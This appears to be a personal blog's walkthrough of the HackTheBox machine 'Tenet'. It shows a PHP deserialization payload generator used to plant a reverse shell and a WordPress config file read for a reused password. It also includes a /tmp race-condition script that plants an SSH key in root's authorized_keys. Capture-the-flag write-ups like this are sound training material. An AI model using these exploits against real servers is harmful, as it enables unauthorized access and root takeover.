<html>
	<head>
		<title>GhostCcamm's Cyber Misadventures</title>
		<meta charset="utf-8" />
		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
		<link rel="stylesheet" href="/assets/css/main.css" />
		<noscript><link rel="stylesheet" href="/assets/css/noscript.css" /></noscript>
	</head>
	<body class="is-preload">

		<!-- Page Wrapper -->
			<div id="page-wrapper">

			<!-- Header -->
				<header id="header" class="alt">
					<h1><a href="index.html">GhostCcamm's Cyber Misadventures</a></h1>
					<nav>
						<a href="#menu">Menu</a>
					</nav>
				</header>

			<!-- Menu -->
				<nav id="menu">
					<div class="inner">
						<h2>Menu</h2>
						<ul class="links">
							<li><a href="/">Home</a></li>
							<li><a href="/blog">Blog</a></li>
							<li><a href="/writeups">Write Ups</a></li>
						</ul>
						<a href="#" class="close">Close</a>
					</div>
				</nav>

			<!-- Banner -->
		    <section id="banner">
		      <div class="inner">
		        <div class="logo"><div class="image"><img src="/images/logo.png" alt="" width="75" height="75" /></div></div>
		        <h2>Tenet</h2>
						<p class="date">2021-01-20</p>
		        <p>When bad house tenets make HackTheBox machines!</p>
		      </div>
		    </section>

      <section id="wrapper">
<section class="wrapper spotlight style3 ">
<div class="inner">
<div class="main_image"><img src=/images/writeups/htb_machines/tenet/tenet.png alt="" /></div>
<div class="content">
<h1 class="major">
 Overview
</h1>
<p>
 I am completely confuddled by the ratings of HackTheBox machines lately... Besides Delivery, the latest Easy boxes should of been rated as Medium and vice versa...
</p>
<p>
 <em>
  Tenet was not an exception to this rule.
 </em>
</p>
<p>
 However, I am not gonna lie but I did really enjoy this box! The PHP deserialization attack for initial foothold was simple yet sweet. It was also noice to flex some BashFU for root as well.
</p>
<p>
 I will jump straight into it since this is a fairly quick box.
</p>
</div>
</div>
</section>
<section class="wrapper style2 alt">
<div class="inner">
<div class="content">

<h2 class="major">
 Initial Foothold
</h2>
<p>
 Now I could of assumed that the box had a web server and SSH open, since most boxes have those ports open. Alas, I went down the conservative route and just did the usual Nmap scan.
</p>
<pre class="codehilite"><code>Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-17 09:51 AWST
Nmap scan report for tenet.htb (10.10.10.223)
Host is up (0.059s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)
|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)
|_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.6
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Tenet
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.63 seconds
</code></pre>
<p>
 Like 99% of the time, the SSH port would not give me an attack vector in
 <em>
  (yet)
 </em>
 , so I visited the website at http://tenet.htb/ after adding
 <code>
  tenet.htb
 </code>
 to my
 <code>
  /etc/hosts
 </code>
 file.
</p>
<p>
 <img alt="" class="center" src="/images/writeups/htb_machines/tenet/tenetweb.png"/>
</p>
<p>
 Seems like another boring Wordpress blog, but it looks like a certain dev called
 <code>
  neil
 </code>
 was peeved off by the main blogger.
</p>
<p>
 <img alt="" class="center" src="/images/writeups/htb_machines/tenet/poorneil.png"/>
</p>
<p>
 If you cannot see the comment from
 <code>
  neil
 </code>
 in the screenshot above, here it is.
</p>
<blockquote>
 <p>
  did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!
 </p>
</blockquote>
<p>
 <em>
  Poor Neil and his plights as a developer.
 </em>
</p>
<p>
 I would of felt more sorry for Neil if he demonstrated better OP sec, but thanks to them I knew I would have to find a file called
 <code>
  sator.php
 </code>
 (this was an educated guess).
</p>
<p>
 Most of you reading this know that it is good practice to add the domain of the box to
 <code>
  /etc/hosts
 </code>
 for enumeration purposes, for an example
 <code>
  tenet.htb
 </code>
 . What took me a solid hour to realise is that
 <em>
  just maybe
 </em>
 there is more information on the default site besides the virtual hosts...
</p>
<p>
 I spent over an hour fuzzing for
 <code>
  sator.php
 </code>
 on
 <code>
  tenet.htb
 </code>
 , when actuality it was sitting right in front of me at http://10.10.10.223/sator.php ...
</p>
<p>
 <img alt="" class="center" src="/images/writeups/htb_machines/tenet/sator.png"/>
</p>
<p>
 <em>
  Oooo I surely do like reading about databases on the boxes I am attacking!
 </em>
</p>
<p>
 After wasting about another hour trying to find this backup that
 <code>
  neil
 </code>
 mentioned, I finally found the backup of
 <code>
  sator.php
 </code>
 at http://10.10.10.223/sator.php.bak. If you didn't know this beforehand, the
 <code>
  .bak
 </code>
 extension is commonly used on Linux boxes for backup files; which I did forget about for a bit.
</p>
<pre class="codehilite"><code>&lt;?php

class DatabaseExport
{
    public $user_file = 'users.txt';
    public $data = '';

    public function update_db()
    {
        echo '[+] Grabbing users from text file &lt;br&gt;';
        $this-&gt; data = 'Success';
    }


    public function __destruct()
    {
        file_put_contents(__DIR__ . '/' . $this -&gt;user_file, $this-&gt;data);
        echo '[] Database updated &lt;br&gt;';
    //  echo 'Gotta get this working properly...';
    }
}

$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);

$app = new DatabaseExport;
$app -&gt; update_db();


?&gt;
</code></pre>
<p>
 <strong>
  ooooooooooooOOOOOOOOOOOOooooooooooooo
 </strong>
</p>
<p>
 <em>
  This code looks ripe for a good old PHP deserialization attack!
 </em>
</p>
<p>
 What is PHP serialization you might ask?
 <s>
  If you know about it just skip a bit.
 </s>
</p>
<p>
 Well, the simplified question is how do you send the state of an instance of a class in Object Oriented Programming (OOP) languages? In PHP, this is done by expressing the state of the instance as a formatted string.
</p>
<p>
 Alright hear me out, let us use the code of
 <code>
  sator.php
 </code>
 as an example and get the serialized string of the
 <code>
  $app
 </code>
 instance of
 <code>
  DatabaseExport
 </code>
 using the below code snippet.
</p>
<p>
 <em>
  payload_gen.php
 </em>
</p>
<pre class="codehilite"><code>&lt;?php

class DatabaseExport
{
    public $user_file = 'users.txt';
    public $data = '';

    public function update_db()
    {
        $this-&gt; data = 'Success';
    }


    public function __destruct()
    {
        file_put_contents(__DIR__ . '/' . $this -&gt;user_file, $this-&gt;data);
    //  echo 'Gotta get this working properly...';
    }
}

$app = new DatabaseExport;
$app -&gt; update_db();

echo serialize($app)."\n";

?&gt;
</code></pre>
<pre class="codehilite"><code>ghostccamm@kali:~/Desktop/hackthebox/machines/tenet/get_init$ php payload_gen.php
O:14:"DatabaseExport":2:{s:9:"user_file";s:9:"users.txt";s:4:"data";s:7:"Success";}
</code></pre>
<p>
 So we can now see how the objects of the
 <code>
  DatabaseExport
 </code>
 class are serialized.
</p>
<ul>
 <li>
  The 'O' at the start is to signal that the serialized string is an Object of a class.
 </li>
 <li>
  The '14' is the number of letters in the name of the Class that the Object is an instance of. In this case it is
  <code>
   DatabaseExport
  </code>
  .
 </li>
 <li>
  The '2' is the number of properties that the object has.
 </li>
</ul>
<p>
 The following '
 <code>
  {}
 </code>
 ' block then expresses the names of the properties and the values of them as well. So for the
 <code>
  user_file
 </code>
 property of
 <code>
  $app
 </code>
 , the name of the property is a string (
 <code>
  s
 </code>
 ) and is 9 characters and its value is also string.
</p>
<p>
 Still confused? You probably are since I only gave a brief introduction on PHP object serialization. Check out this
 <a href="https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a">
  Medium Article by Vickie Li
 </a>
 where she went into far greater detail about PHP serialization and how you can exploit it.
</p>
<p>
 Getting back to Tenet now, we can modify the
 <code>
  user_file
 </code>
 and
 <code>
  data
 </code>
 properties from the serialized string we send using the GET parameter
 <code>
  arepo
 </code>
 .
</p>
<p>
 <strong>
  This means that we can save a PHP file onto the webserver!
 </strong>
</p>
<p>
 I wrote a neat little Python script that will construct the payload that I will send to the server. The serialized string needed to be URL encoded as well, since it is sent as a GET parameter in the URL.
</p>
<pre class="codehilite"><code>import sys, urllib.parse

def main(filename):
    lines = []

    data = ""

    for line in sys.stdin:
        data = data + line

    payload = 'O:14:"DatabaseExport":2:{{s:9:"user_file";s:{}:"{}";s:4:"data";s:{}:"{}";}}'.format(len(filename), filename, len(data), data)

    print(urllib.parse.quote_plus(payload))


if __name__ == "__main__":
    try:
        filename = sys.argv[1]
    except:
        print("You need to give a file name!")
        sys.exit(1)

    main(filename)
</code></pre>
<p>
 I then just piped the
 <code>
  php-reverse-shell.php
 </code>
 file that comes pre-packaged with Kali Linux as my payload and uploaded it onto the box.
</p>
<p>
 <img alt="" class="center" src="/images/writeups/htb_machines/tenet/exploit.png"/>
</p>
<p>
 Now chucking that payload into the
 <code>
  http://10.10.10.223/sator.php?arepo=&lt;payload here&gt;
 </code>
 , I was able to upload my reverse shell and get initial foothold!
</p>
<p>
 <img alt="" class="center" src="/images/writeups/htb_machines/tenet/noicegotrs.png"/>
</p>
<p>
 <strong>
  nooooOOOooooiice
 </strong>
</p>
</div>
</div>
</section>
<section class="wrapper style5 ">
<div class="inner">
<div class="content">

<h1 class="major">
 Getting User
</h1>
<p>
 Well after all of this talk about databases, I decided to look for some database credentials. Heading over to
 <code>
  /var/www/html/wordpress/wp-config.php
 </code>
 I found what I was looking for.
</p>
<pre class="codehilite"><code>$ cat /var/www/html/wordpress/wp-config.php
&lt;?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'neil' );

/** MySQL database password */
define( 'DB_PASSWORD', 'Opera2112' );
</code></pre>
<p>
 Now I would normally check the contents of the database first, but for some reason I decided to see if I could login as
 <code>
  neil
 </code>
 with the password "Opera2112" (oh by the way he is a user on the box).
</p>
<p>
 <img alt="" class="center" src="/images/writeups/htb_machines/tenet/dbpass.png"/>
</p>
<p>
 <strong>
  Lo and behold! I got neil's account!
 </strong>
</p>
<p>
 To be honest, I felt like wasted all that time with the enumeration and PHP serialization attack that I did earlier where I could of easily bruteforced neil's password with a good educated guess of the password...
</p>
<p>
 <em>
  Like "Opera" is literally in the icon for the box...
 </em>
</p>
<p>
 <img alt="" class="center" src="/images/writeups/htb_machines/tenet/tenet.png"/>
</p>
<p>
 Oh well... I learnt the lesson to always blast boxes with
 <code>
  hydra
 </code>
 and ignore HackTheBox rules. I assume some script kiddie out there was pretty darn happy that for the first time ever bruteforcing SSH works from the very start (if they had a big enough brain to make a good enough wordlist).
</p>
</div>
</div>
</section>
<section class="wrapper style6 alt">
<div class="inner">
<div class="content">

<h1 class="major">
 Getting Root
</h1>
<p>
 After I got in as
 <code>
  neil
 </code>
 , one of the first things I checked was running
 <code>
  sudo -l
 </code>
 .
</p>
<p>
 <img alt="" class="center" src="/images/writeups/htb_machines/tenet/oooowotsthisthesecond.png"/>
</p>
<p>
 Well that sudoers entry looked way to juicy to ignore, so I took a closer look at
 <code>
  /usr/local/bin/enableSSH.sh
 </code>
 .
</p>
<p>
 <em>
  enableSSH.sh
 </em>
</p>
<pre class="codehilite"><code>neil@tenet:~$ cat /usr/local/bin/enableSSH.sh
#!/bin/bash

checkAdded() {

    sshName=$(/bin/echo $key | /usr/bin/cut -d " " -f 3)

    if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then

        /bin/echo "Successfully added $sshName to authorized_keys file!"

    else

        /bin/echo "Error in adding $sshName to authorized_keys file!"

    fi

}

checkFile() {

    if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then

        /bin/echo "Error in creating key file!"

        if [[ -f $1 ]]; then /bin/rm $1; fi

        exit 1

    fi

}

addKey() {

    tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)

    (umask 110; touch $tmpName)

    /bin/echo $key &gt;&gt;$tmpName

    checkFile $tmpName

    /bin/cat $tmpName &gt;&gt;/root/.ssh/authorized_keys

    /bin/rm $tmpName

}

key="ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu"
addKey
checkAdded
</code></pre>
<p>
 Oh that is a pretty neat
 <s>
  but so unrealistic
 </s>
 bash script there. I immediately noticed that the key stored inside at
 <code>
  /tmp/ssh-XXXXXXXX
 </code>
 is then copied to
 <code>
  /root/.ssh/authorized_keys
 </code>
 , which was exactly what I wanted. Only thing was that I wouldn't know the name of temp file preemptively, but if I was quick I could chuck in my SSH public key instead of the one in
 <code>
  enableSSH.sh
 </code>
 .
</p>
<p>
 I decided to bust out my BashFU and try to get my SSH key in. I used the command
 <code>
  find /tmp -name "ssh-*" -maxdepth 1 2&gt;/dev/null
 </code>
 to list all of the temp ssh files and just piped my SSH key into them. Below is my exploit bash script that I wrote and uploaded to the box. I knew that it had executed successfully if when I ran
 <code>
  sudo enableSSH.sh
 </code>
 it returned back with "Error in adding $sshName to authorized_keys file!".
</p>
<pre class="codehilite"><code>while :;
do
    files=`find /tmp -name "ssh-*" -maxdepth 1 2&gt;/dev/null`
    for p in $files
    do
        echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzKUsFpNACl75KbSr4trd57XlBGm+x7FB8Jo0eWUuBITVLYu1UHpck+UcAclH4sWPRHUlUMB9zzi4mvX0PEniWb14rC49M0om8I+/7vhtSUiOJ/DC/U/Cb8t05Y5nOkmwAAhb0mlyXFq3OprFKRKCzPMNY2OChdLndyw+V8y53OsVEjzUuFNOo+2J/B8kYLxW+MRKWxEugjpY7CZF9m6fqAFo0caSjYh9454/2OaItCOqwQD06dedPQQbp7yZRv4y//ST6NjX96S3xlPX6oZU4mkJxmgn4S+ufcczSvDT6HEfHDgF1+7GoZn3szQvLH5CCV3GH0a8aC9NLWrPXCVgeUxQMlEBV4kSyPaTeuiW66mDu5+4+nQ3XYjKm/jLDQzs5+IKpbYn/5NpKoRmktP4kAcmMFoFrUVZC9d1lQDmTKcF3ZJVG6KgW68+Xwj+RmIdiLSufeXdkbudInYeTBXCeLEO1nAetQj1kaPp7DFN6+tLPmg+C9UDqNfnl8cCzB3c= ghost@yourshell" &gt; $p;
        echo "Dumped Payload Into $p"
    done
done
</code></pre>
<p>
 <img alt="" class="center" src="/images/writeups/htb_machines/tenet/letsgetroot.png"/>
</p>
<p>
 <strong>
  nnnnoooooooOOOOOooooooooooiiiiccceeee
 </strong>
</p>
<p>
 All that was left to do was SSH in.
</p>
<p>
 <img alt="" class="center" src="/images/writeups/htb_machines/tenet/aywegotroot.png"/>
</p>
<p>
 <strong>
  nnnnooooooo000000000OOOOOOOOOO000000000ooooooooooiiiiccceeee
 </strong>
</p>
</div>
</div>
</section>
<section class="wrapper style1 ">
<div class="inner">
<div class="content">

<h1 class="major">
 Conclusion
</h1>
<p>
 Yeah this was a definitely a fun, quick, nice box. Although it was (once again) more like playing a CTF than something realistic, it was still an enjoyable and educational experience. I knew about PHP deserialization attacks beforehand from watching YouTube videos on the topic
 <s>
  (Papa Bless you IppSec)
 </s>
 , but I never done one in HackTheBox before.
</p>
<p>
 Cheers for the sweet box egotisticalSW!
</p></div>
</div>
</section>
</section>

    	</div>

    <!-- Footer -->
      <!-- Footer -->
  <section id="footer">
    <div class="inner">
      <ul class="icons">
        <li><a href="https://twitter.com/GhostCcamm" class="icon brands fa-twitter"><span class="label"></span></a></li>
        <li><a href="https://github.com/Ccamm" class="icon brands fa-github"><span class="label"></span></a></li>
      </ul>
    </div>
  </section>

		<!-- Particles -->
			<div id="particles-js"></div>

		<!-- Scripts -->
			<script src="/assets/js/jquery.min.js"></script>
			<script src="/assets/js/jquery.scrollex.min.js"></script>
			<script src="/assets/js/browser.min.js"></script>
			<script src="/assets/js/breakpoints.min.js"></script>
			<script src="/assets/js/util.js"></script>
			<script src="/assets/js/particles.min.js"></script>
			<script src="/assets/js/main.js"></script>
      
	</body>
</html>